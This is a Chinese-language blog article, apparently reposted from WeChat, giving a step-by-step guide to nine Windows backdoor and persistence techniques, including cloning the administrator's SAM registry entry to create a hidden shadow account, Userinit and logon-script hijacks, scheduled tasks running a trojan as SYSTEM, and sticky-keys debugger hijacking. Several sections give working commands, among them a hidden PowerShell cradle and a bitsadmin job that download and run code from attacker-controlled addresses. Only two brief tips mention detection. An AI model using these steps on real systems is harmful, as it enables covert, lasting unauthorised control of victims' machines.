> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LsjvUID-diMGILbsqwWsuw)

**1、影子账户**  

（1）创建隐藏账户并加入管理员组  

![图片](https://mmbiz.qpic.cn/mmbiz_png/z62BWhLicMkvYwWOGekH2jXumUsGLl8icicD4pewibFa8vnSoSQ0cmlibZcjNw0uy3mLHaUibBCsVBkeHjJkQRFB1Vfw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

（2）运行regedit打开注册表

对`HKEY_LOCAL_MACHINE/SAM/SAM`右键->权限赋予当前用户administrator的具有完全控制和读取权限

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/z62BWhLicMkvYwWOGekH2jXumUsGLl8icicDzFBETe49MVuPKX8icGc8Qo9FkIvia1nVEUQXJAEiaYdBrZUS77uibkic3g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

（3）重新打开注册表，定位到

HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names

查看administrator对应的键值为F4和隐藏账户lifeiyu123$的键值为3EB

然后在Users中找到对应数字的F值，将3EB的F值替换为1f4的F值

将00003EB和lifeiyu123$按顺序导出为1.reg和2.reg

![图片](https://mmbiz.qpic.cn/mmbiz_png/z62BWhLicMkvYwWOGekH2jXumUsGLl8icicaicnQZIxImU2Hgu0s4NQ38LsQvpkLwQTYIuibV2wuSINDOucMblPiarNA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

（4）然后命令行中删除隐藏用户

![图片](https://mmbiz.qpic.cn/mmbiz_png/z62BWhLicMkvYwWOGekH2jXumUsGLl8icicCGpoQ6CstG5FYrMHwTT9caJyjOicNgYaZeJ10AWUZBbPcP6z9xSdgMg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

（5）按顺序点击刚才导出的reg文件，重新导入

重新添加到管理员组

![图片](https://mmbiz.qpic.cn/mmbiz_png/z62BWhLicMkvYwWOGekH2jXumUsGLl8icic26xkbNEzO8xQRgEfd6mDGWbVEFkX7wXgtxicrgHCOUasCI2l75JFyXw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（6）此时命令行和本地用户组都查不到test$这个账户，只有注册表可以看到，我们就可以用这个影子账户进行远程登录

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

**2、RUN注册表**  

（1）运行regedit打开注册表

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run这个注册表存放的为开机启动项，每次开机都会自动运行进程或脚本。

（2）新建一个字符串值，并填写数值数据即可完成开启启动

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**3、Logon script注册表**  

（1）运行regedit打开注册表

HKEY_CURRENT_USER\Environment所指的程序会在杀毒软件启动前启动，有时可以绕过杀毒，而且修改它不需要管理员权限。

tips：常规火绒剑等查看启动项无法发现，只能在注册表内分析看到

（2）新增一个值UserInitMprLogonScript，并修改值即可实现  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（3）powershell

New-ItemProperty "HKCU:\Environment\" UserInitMprLogonScript -value "c:\test\1.bat" -propertyType string | Out-Null

（4）wmic

wmic ENVIRONMENT create c:\test\1.bat"

  

**4、userinit注册表**

（1）运行regedit打开注册表

HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\Userinit增加数值数据实现登陆时运行脚本，结合msf实现无文件后门（需要管理员权限）

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（2）powershell配合msf实现无文件  

```
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon" -name Userinit -value "C:\Windows\system32\userinit.exe,powershell.exe -w hidden -noexit -nop  -c $T=new-object net.webclient;$T.proxy=[Net.WebRequest]::GetSystemWebProxy();$T.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $T.downloadstring('\\192.168.143.129\bfvaNe\test.dll');"
```

  

**5、计划任务后门**

Windows计划任务后门实现主要为schtasks或at其中at在win8后已不受支持  

（1）schtasks  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（2）将生成的后门木马 lifeiyu.exe 上传到目标机内，然后在目标机内执行以下指令，创建一个qqq计划任务，每一分钟执行一次lifeiyu.exe。

schtasks /create /tn qqq /sc minute /mo 1 /tr C:\Users\Administrator\Desktop\lifeiyu.exe /ru system /f

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**6、bitsadmin后门**  

Bitsadmin从win7之后操作系统就默认包含，可以用来创建上传或者下载任务。Bistadmin可以指定下载成功之后要进行什么命令。后门就是利用的下载成功之后进行命令执行。

（1）命令  

#创建任务名称为 lifeiyu：

bitsadmin /create lifeiyu

#将文件下载至本地：

bitsadmin /addfile lifeiyu http://192.168.1.12/xxx.exe "%temp%\cmd.exe"

#文件下载成功执行命令：

bitsadmin.exe /SetNotifyCmdLine lifeiyu  %comspec%  "cmd.exe/c calc.exe"

#执行任务：

bitsadmin /Resume lifeiyu

#完成任务：  

bitsadmin /complete lifeiyu

  

**7、WMI型后门**  

wmi常用于信息收集

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可使用后渗透框架Empire进行

https://github.com/EmpireProject/Empire

（1）使用wmi模块前先获取主机shell

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（2）在被控主机执行powershell代码完成上线

（3） 使用模块usemodule persistence/elevated/wmi获取wmi永久订阅完成持久化

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

tips：蓝队检测可使用Autoruns

  

**8、Nishang后门**

nishang 是一款针对 powershell的渗透工具。它基于 PowerShell 的渗透测试专用工具，集成了框架、脚本和各种payload，包括了下载和执行、键盘记录、DNS、延时命令等脚本，被广泛应用于渗透测试的各个阶段。

具体使用可参考：https://blog.csdn.net/weixin_46104215/article/details/121493736  

  

**9、shift粘贴键后门**

Shift粘滞键是当用户连按5次shift就会自动弹出的一个程序，其实不光是粘滞键，还有各种辅助功能，这类辅助功能都拥有一个特点就是当用户未进行登录时也可以触发。所以攻击者很有可能通过篡改这些辅助功能的指向程序来达到权限维持的目的

（1）粘滞键的启动程序在C盘的Windows/system32目录下为sethc.exe

所以我们打开注册表，定位到以下路径：

HKEY_LOCAL_MACHINE\ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Image File ExecutionOption

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

（2）在目录中新建一个sethc.exe的子项，并添加一个新键debugger，debugger的对应键值为后门木马的路径，C:\Windows\system32\lifeiyu.exe  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

tips：应急时使用Autoruns查看镜像劫持